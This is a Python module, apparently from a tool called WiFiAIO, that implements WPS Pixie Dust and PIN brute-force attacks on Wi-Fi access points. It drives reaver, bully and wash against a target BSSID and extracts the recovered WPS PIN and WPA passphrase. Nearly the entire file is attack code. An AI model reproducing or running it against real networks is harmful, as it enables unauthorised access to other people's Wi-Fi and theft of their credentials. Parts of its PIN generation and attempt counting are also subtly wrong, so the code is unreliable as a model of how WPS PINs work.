"""
WiFiAIO WPS Engine Module

Implements WPS Pixie Dust attack, PIN brute-force, and checksum validation.
"""

import os
import re
import time
import logging
import subprocess
from typing import List, Dict, Optional, Any, Generator, Tuple
from dataclasses import dataclass, field
from enum import Enum

from wifi_aio.exceptions import (
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
    WPSError,
)

logger = logging.getLogger(__name__)


class WPSMethod(Enum):
    """WPS attack methods."""
    PIXIE_DUST = "pixie_dust"
    PIN_BRUTEFORCE = "pin_bruteforce"


@dataclass
class WPSResult:
    """Result of a WPS attack."""
    success: bool = False
    pin: str = ""
    psk: str = ""
    ssid: str = ""
    bssid: str = ""
    method: str = ""
    time_elapsed: float = 0.0
    pins_tried: int = 0
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "pin": self.pin,
            "psk": self.psk,
            "ssid": self.ssid,
            "bssid": self.bssid,
            "method": self.method,
            "time_elapsed": self.time_elapsed,
            "pins_tried": self.pins_tried,
        }


@dataclass
class WPSNetworkInfo:
    """WPS information about a target network."""
    bssid: str = ""
    ssid: str = ""
    channel: int = 0
    wps_version: int = 1
    wps_locked: bool = False
    wps_state: str = ""
    model_name: str = ""
    model_number: str = ""
    device_name: str = ""
    manufacturer: str = ""
    serial: str = ""
    config_methods: str = ""
    ap_setup_locked: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "bssid": self.bssid,
            "ssid": self.ssid,
            "channel": self.channel,
            "wps_version": self.wps_version,
            "wps_locked": self.wps_locked,
            "wps_state": self.wps_state,
            "model_name": self.model_name,
            "model_number": self.model_number,
            "device_name": self.device_name,
            "manufacturer": self.manufacturer,
            "config_methods": self.config_methods,
            "ap_setup_locked": self.ap_setup_locked,
        }


class WPSEngine:
    """
    WPS attack engine supporting Pixie Dust and PIN brute-force.

    Implements WPS PIN checksum validation and efficient PIN generation.
    """

    def __init__(self, interface: str = "wlan0mon"):
        """
        Initialize WPSEngine.

        Args:
            interface: Monitor mode interface.
        """
        self.interface = interface
        self._running = False
        self._pins_tried = 0

    def _check_root(self) -> None:
        """Verify running as root."""
        if os.geteuid() != 0:
            raise WiFiPermissionError("WPS attacks require root privileges")

    @staticmethod
    def compute_checksum(pin: int) -> int:
        """
        Compute WPS PIN checksum digit.

        The WPS PIN is 8 digits: 7 data digits + 1 checksum digit.
        The checksum is computed using a weighted sum algorithm.

        Args:
            pin: 7-digit PIN value (0-9999999).

        Returns:
            Single checksum digit (0-9).
        """
        accum = 0
        while pin > 0:
            digit = pin % 10
            pin //= 10
            accum += 3 * digit
            digit = pin % 10
            pin //= 10
            accum += digit
        return (10 - (accum % 10)) % 10

    @classmethod
    def validate_pin(cls, pin: str) -> bool:
        """
        Validate a WPS PIN including checksum.

        Args:
            pin: 8-digit PIN string.

        Returns:
            True if the PIN is valid.
        """
        if len(pin) != 8 or not pin.isdigit():
            return False
        data_digits = int(pin[:7])
        checksum = int(pin[7])
        return cls.compute_checksum(data_digits) == checksum

    @classmethod
    def generate_pin(cls, first_half: int) -> str:
        """
        Generate a full 8-digit WPS PIN from a 4-digit first half.

        The WPS PIN brute-force is split into two halves:
        - First half: digits 1-4 (0000-9999)
        - Second half: digits 5-7 (000-9999) + checksum

        Args:
            first_half: 4-digit value for the first half (0-9999).

        Returns:
            8-digit PIN string with correct checksum.
        """
        # First 4 digits
        pin_base = first_half * 10000
        # Compute checksum for the 7 data digits
        checksum = cls.compute_checksum(pin_base)
        return f"{pin_base + checksum:08d}"

    @classmethod
    def generate_pin_list(cls, start: int = 0, end: int = 9999) -> Generator[str, None, None]:
        """
        Generate WPS PINs as a generator (not a list).

        FIX: This is a @classmethod using cls, not @staticmethod.
        Yields PINs as a generator instead of building a 10M element list.

        Args:
            start: Starting first-half value.
            end: Ending first-half value (inclusive).

        Yields:
            8-digit WPS PIN strings with valid checksums.
        """
        for first_half in range(start, min(end + 1, 10000)):
            yield cls.generate_pin(first_half)

    def pixie_dust_attack(self, bssid: str, channel: int,
                          timeout: int = 300) -> WPSResult:
        """
        Perform WPS Pixie Dust attack using reaver/bully.

        The Pixie Dust attack exploits a vulnerability in some WPS
        implementations where the enrollee nonce (PKE) and hash
        can be used to offline-bruteforce the PIN.

        Args:
            bssid: Target AP BSSID.
            channel: Target AP channel.
            timeout: Attack timeout in seconds.

        Returns:
            WPSResult with attack outcome.
        """
        self._check_root()
        self._running = True
        start_time = time.time()
        result = WPSResult(bssid=bssid, method=WPSMethod.PIXIE_DUST.value)

        # Set channel
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                check=True, capture_output=True, timeout=10
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
            raise WPSError(f"Failed to set channel {channel}: {e}")

        # Try reaver first
        try:
            cmd = [
                "reaver",
                "-i", self.interface,
                "-b", bssid,
                "-c", str(channel),
                "-K", "1",  # Pixie Dust attack
                "-vv",
                "-T", str(timeout),
            ]
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            output_lines = []
            try:
                while self._running:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    output_lines.append(line.strip())
                    logger.debug("reaver: %s", line.strip())

                    # Check for success
                    if "WPS PIN" in line:
                        pin_match = re.search(r"WPS PIN:\s*['\x22]?(\d{8})['\x22]?", line)
                        if pin_match:
                            result.pin = pin_match.group(1)
                            result.success = True

                    if "WPA PSK" in line or "PSK" in line:
                        psk_match = re.search(r'PSK:\s*[\'"\x22](.+)[\'"\x22]', line)
                        if psk_match:
                            result.psk = psk_match.group(1)
                            result.success = True

                    if "AP PIN" in line:
                        pin_match = re.search(r'AP PIN:\s*[\'"\x22]?(\d{8})[\'"\x22]?', line)
                        if pin_match:
                            result.pin = pin_match.group(1)
                            result.success = True

                    # Check timeout
                    if time.time() - start_time > timeout:
                        break

            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()

        except FileNotFoundError:
            # Try bully as fallback
            try:
                cmd = [
                    "bully",
                    self.interface,
                    "-b", bssid,
                    "-c", str(channel),
                    "-d",  # Pixie Dust
                    "-v", "3",
                ]
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
                )

                output_lines = []
                try:
                    while self._running:
                        line = proc.stdout.readline()
                        if not line:
                            break
                        output_lines.append(line.strip())

                        if "Pin is" in line or "PIN:" in line:
                            pin_match = re.search(r"(\d{8})", line)
                            if pin_match:
                                result.pin = pin_match.group(1)
                                result.success = True

                        if "PSK" in line:
                            psk_match = re.search(r'[\'"\x22](.+)[\'"\x22]', line)
                            if psk_match:
                                result.psk = psk_match.group(1)

                        if time.time() - start_time > timeout:
                            break
                finally:
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()

            except FileNotFoundError:
                raise WPSError(
                    "Neither reaver nor bully found. "
                    "Install one of: apt install reaver bully"
                )

        self._running = False
        result.time_elapsed = time.time() - start_time
        return result

    def pin_bruteforce(self, bssid: str, channel: int,
                       start_pin: str = "00000000",
                       end_pin: str = "99999999",
                       delay: float = 1.0,
                       max_attempts: int = 0,
                       timeout: int = 0) -> WPSResult:
        """
        Perform WPS PIN brute-force attack.

        The attack tries each valid PIN sequentially until the correct
        one is found or limits are reached.

        Args:
            bssid: Target AP BSSID.
            channel: Target AP channel.
            start_pin: Starting PIN to try.
            end_pin: Ending PIN to try.
            delay: Delay between attempts in seconds.
            max_attempts: Maximum number of PINs to try (0 = unlimited).
            timeout: Maximum runtime in seconds (0 = unlimited).

        Returns:
            WPSResult with attack outcome.
        """
        self._check_root()
        self._running = True
        self._pins_tried = 0
        start_time = time.time()
        result = WPSResult(bssid=bssid, method=WPSMethod.PIN_BRUTEFORCE.value)

        # Set channel
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                check=True, capture_output=True, timeout=10
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
            raise WPSError(f"Failed to set channel {channel}: {e}")

        # Determine starting first-half from start_pin
        start_half = int(start_pin[:4]) if len(start_pin) >= 4 else 0
        end_half = int(end_pin[:4]) if len(end_pin) >= 4 else 9999

        # Check if reaver is available for individual PIN attempts
        has_reaver = os.path.isfile("/usr/bin/reaver") or os.path.isfile("/usr/local/bin/reaver")
        has_bully = os.path.isfile("/usr/bin/bully") or os.path.isfile("/usr/local/bin/bully")

        if has_reaver:
            result = self._pin_bruteforce_reaver(
                bssid, channel, start_half, end_half,
                delay, max_attempts, timeout
            )
        elif has_bully:
            result = self._pin_bruteforce_bully(
                bssid, channel, start_half, end_half,
                delay, max_attempts, timeout
            )
        else:
            # Manual PIN attempt via raw WPS protocol simulation
            result = self._pin_bruteforce_manual(
                bssid, channel, start_half, end_half,
                delay, max_attempts, timeout
            )

        self._running = False
        result.time_elapsed = time.time() - start_time
        result.pins_tried = self._pins_tried
        return result

    def _pin_bruteforce_reaver(self, bssid: str, channel: int,
                                start_half: int, end_half: int,
                                delay: float, max_attempts: int,
                                timeout: int) -> WPSResult:
        """PIN brute-force using reaver."""
        result = WPSResult(bssid=bssid, method=WPSMethod.PIN_BRUTEFORCE.value)
        start_time = time.time()

        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-s", str(start_half),  # Starting pin half
            "-vv",
            "-d", str(int(delay)),
        ]

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            while self._running:
                line = proc.stdout.readline()
                if not line:
                    break

                self._pins_tried += 1
                logger.debug("reaver PIN attempt: %s", line.strip())

                if "WPS PIN" in line or "Pin found" in line:
                    pin_match = re.search(r"(\d{8})", line)
                    if pin_match and self.validate_pin(pin_match.group(1)):
                        result.pin = pin_match.group(1)
                        result.success = True
                        break

                if "WPA PSK" in line:
                    psk_match = re.search(r'PSK:\s*[\'"\x22](.+)[\'"\x22]', line)
                    if psk_match:
                        result.psk = psk_match.group(1)

                if max_attempts > 0 and self._pins_tried >= max_attempts:
                    break

                if timeout > 0 and time.time() - start_time > timeout:
                    break

            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

        except FileNotFoundError:
            raise WPSError("reaver not found")

        return result

    def _pin_bruteforce_bully(self, bssid: str, channel: int,
                               start_half: int, end_half: int,
                               delay: float, max_attempts: int,
                               timeout: int) -> WPSResult:
        """PIN brute-force using bully."""
        result = WPSResult(bssid=bssid, method=WPSMethod.PIN_BRUTEFORCE.value)
        start_time = time.time()

        start_pin = self.generate_pin(start_half)

        cmd = [
            "bully",
            self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-p", start_pin,
            "-v", "3",
        ]

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            while self._running:
                line = proc.stdout.readline()
                if not line:
                    break

                self._pins_tried += 1
                logger.debug("bully PIN attempt: %s", line.strip())

                pin_match = re.search(r"Pin\s*.*?(\d{8})", line)
                if pin_match and self.validate_pin(pin_match.group(1)):
                    result.pin = pin_match.group(1)
                    result.success = True
                    break

                if max_attempts > 0 and self._pins_tried >= max_attempts:
                    break

                if timeout > 0 and time.time() - start_time > timeout:
                    break

            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

        except FileNotFoundError:
            raise WPSError("bully not found")

        return result

    def _pin_bruteforce_manual(self, bssid: str, channel: int,
                                start_half: int, end_half: int,
                                delay: float, max_attempts: int,
                                timeout: int) -> WPSResult:
        """Manual PIN brute-force via raw WPS M2/M2D messages."""
        result = WPSResult(bssid=bssid, method=WPSMethod.PIN_BRUTEFORCE.value)
        start_time = time.time()

        # Use wash to scan for WPS networks first
        try:
            wash_result = subprocess.run(
                ["wash", "-i", self.interface, "-c", str(channel)],
                capture_output=True, text=True, timeout=30
            )
            if bssid.lower() not in wash_result.stdout.lower():
                logger.warning("Target BSSID not found in wash scan; AP may not support WPS")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Iterate through PINs
        for pin in self.generate_pin_list(start=start_half, end=end_half):
            if not self._running:
                break

            self._pins_tried += 1

            # Send WPS PIN attempt via reaver one-pin mode
            try:
                attempt_result = subprocess.run(
                    ["reaver", "-i", self.interface, "-b", bssid,
                     "-c", str(channel), "-p", pin, "-vv"],
                    capture_output=True, text=True, timeout=15
                )
                output = attempt_result.stdout + attempt_result.stderr

                if "WPA PSK" in output:
                    psk_match = re.search(r'PSK:\s*[\'"\x22](.+)[\'"\x22]', output)
                    if psk_match:
                        result.psk = psk_match.group(1)
                    result.pin = pin
                    result.success = True
                    break

                if "AP rate limiting" in output or "WPSFAIL" in output:
                    logger.info("AP rate limiting detected, waiting...")
                    time.sleep(delay * 5)

            except subprocess.TimeoutExpired:
                logger.debug("PIN %s attempt timed out", pin)
            except FileNotFoundError:
                raise WPSError("reaver not found for manual brute-force")

            if delay > 0:
                time.sleep(delay)

            if max_attempts > 0 and self._pins_tried >= max_attempts:
                break

            if timeout > 0 and time.time() - start_time > timeout:
                break

        return result

    def scan_wps(self, channel: Optional[int] = None,
                 timeout: int = 30) -> List[WPSNetworkInfo]:
        """
        Scan for WPS-enabled networks using wash.

        Args:
            channel: Optional specific channel to scan.
            timeout: Scan timeout in seconds.

        Returns:
            List of WPSNetworkInfo objects.
        """
        self._check_root()
        networks: List[WPSNetworkInfo] = []

        cmd = ["wash", "-i", self.interface]
        if channel is not None:
            cmd.extend(["-c", str(channel)])

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            output = result.stdout

            for line in output.splitlines():
                line = line.strip()
                if not line or line.startswith("--") or line.startswith("BSSID"):
                    continue

                parts = line.split()
                if len(parts) < 6:
                    continue

                try:
                    net = WPSNetworkInfo(
                        bssid=parts[0],
                        channel=int(parts[1]),
                        wps_version=int(parts[2]) if parts[2].isdigit() else 1,
                        wps_locked="L" in parts[3] if len(parts) > 3 else False,
                        ssid=" ".join(parts[5:]) if len(parts) > 5 else "",
                    )
                    networks.append(net)
                except (ValueError, IndexError):
                    continue

        except FileNotFoundError:
            # Fallback: parse airodump WPS output
            cmd = ["airodump-ng", self.interface, "--wps"]
            if channel is not None:
                cmd.extend(["-c", str(channel)])

            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                time.sleep(timeout)
                proc.terminate()
                proc.wait(timeout=5)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

        return networks

    def stop(self) -> None:
        """Stop the current WPS attack."""
        self._running = False
        logger.info("WPS engine stopped")

    def get_pins_tried(self) -> int:
        """Get number of PINs tried in current/last session."""
        return self._pins_tried
